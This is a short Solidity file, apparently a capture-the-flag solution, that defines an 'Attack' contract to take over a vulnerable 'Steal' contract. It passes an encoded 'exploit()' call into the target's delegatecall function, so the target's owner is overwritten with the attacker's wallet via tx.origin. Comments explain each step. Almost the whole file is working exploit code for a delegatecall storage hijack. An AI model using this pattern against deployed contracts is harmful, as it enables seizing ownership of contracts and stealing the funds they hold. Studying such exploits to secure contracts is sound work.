//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Poly.sol";

contract Attack{
    
    address public owner = msg.sender;

    function exploit() public {
        owner= tx.origin;
        //here I set the owner as my EOA wallet, this will go back through the whole 
        //chain of txns and retrieve the original sender 
    }

    function attack(address x) public {
        Steal(x).steal(address(this), abi.encodeWithSignature("exploit()"));
        //here I call the function that delegatecalls inside the Steal contract 
    }
}
